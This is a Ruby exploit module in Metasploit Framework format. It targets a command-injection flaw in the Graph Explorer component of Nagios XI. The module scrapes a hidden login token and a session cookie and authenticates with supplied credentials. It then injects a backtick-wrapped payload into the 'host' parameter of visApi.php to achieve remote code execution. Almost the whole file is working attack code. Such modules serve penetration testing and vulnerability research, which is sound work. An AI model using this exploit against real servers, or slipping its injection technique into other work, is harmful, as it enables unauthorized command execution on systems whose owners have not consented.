# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Nagios XI Network Monitor Graph Explorer Component Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Nagios XI Network Monitor&#039;s
                component &#039;Graph Explorer&#039;.  An authenticated user can execute system commands
                by injecting it in several parameters, such as in visApi.php&#039;s &#039;host&#039; parameter,
                which results in remote code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Daniel Compton <daniel.compton[at]ngssecure.com>&#039;, #Original discovery
                    &#039;sinn3r&#039;
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;83552&#039; ],
                    [ &#039;BID&#039;, &#039;54263&#039; ],
                    [ &#039;URL&#039;, &#039;http://packetstormsecurity.org/files/118497/Nagios-XI-Network-Monitor-2011R1.9-OS-Command-Injection.html&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0d\x0a",
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl python ruby bash telnet&#039;,
                        }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;Graph Explorer Component prior to 1.3&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Nov 30 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                # URI isn&#039;t registered, because this is set by the installer.
                OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;, &#039;nagiosadmin&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to use&#039;])
            ], self.class)
    end
 
 
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/nagiosxi/includes/components/graphexplorer/visApi.php&#039;
        })
 
        if res and res.code == 404
            print_error("Remote host does not have Graph Explorer installed.")
        elsif res and res.body =~ /Your session has timed out/
            return Exploit::CheckCode::Detected
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def get_login_data
        res = send_request_cgi({&#039;uri&#039;=>&#039;/nagiosxi/login.php&#039;})
        return &#039;&#039; if !res
 
        nsp = res.body.scan(/<input type=&#039;hidden&#039; name=&#039;nsp&#039; value=&#039;(.+)&#039;>/).flatten[0] || &#039;&#039;
        cookie = (res.headers[&#039;Set-Cookie&#039;] || &#039;&#039;).scan(/nagiosxi=(\w+); /).flatten[0]  || &#039;&#039;
        return nsp, cookie
    end
 
    def is_loggedin(cookie)
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/nagiosxi/index.php&#039;,
            &#039;cookie&#039; => "nagiosxi=#{cookie}"
        })
 
        if res and res.body =~ /Logged in as: <a href=".+">#{datastore[&#039;USERNAME&#039;]}<\/a>/
            return true
        else
            return false
        end
    end
 
    def login(nsp, cookie)
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => &#039;/nagiosxi/login.php&#039;,
            &#039;cookie&#039;    => "nagiosxi=#{cookie}",
            &#039;vars_post&#039; => {
                &#039;nsp&#039;         => nsp,
                &#039;page&#039;        => &#039;auth&#039;,
                &#039;debug&#039;       => &#039;&#039;,
                &#039;pageopt&#039;     => &#039;login&#039;,
                &#039;username&#039;    => datastore[&#039;USERNAME&#039;],
                &#039;password&#039;    => datastore[&#039;PASSWORD&#039;],
                &#039;loginButton&#039; => &#039;Login&#039;
            },
            &#039;headers&#039;   => {
                &#039;Origin&#039;  => "http://#{rhost}",
                &#039;Referer&#039; => "http://#{rhost}/nagiosxi/login.php"
            }
        })
 
        return is_loggedin(cookie)
    end
 
    def exploit
        nsp, cookie = get_login_data
        if nsp.empty?
            print_error("Unable to retrieve hidden value &#039;nsp&#039;")
            return false
        end
 
        if login(nsp, cookie)
            print_status("Logged in as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")
        else
            print_error("Failed to login as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")
            return
        end
 
        print_status("Sending Command injection")
        send_request_cgi({
            &#039;method&#039;   => &#039;GET&#039;,
            &#039;uri&#039;      => &#039;/nagiosxi/includes/components/graphexplorer/visApi.php&#039;,
            &#039;cookie&#039;   => "nagiosxi=#{cookie}",
            &#039;vars_get&#039; => {
                &#039;type&#039; => &#039;stack&#039;,
                &#039;host&#039; => "localhost`#{payload.encoded}`",
                &#039;service&#039; => &#039;Swap_Usage&#039;,
                &#039;div&#039;     => &#039;visContainer1566841654&#039;,
                &#039;opt&#039;     => &#039;days&#039;
            }
        })
    end
 
 
end

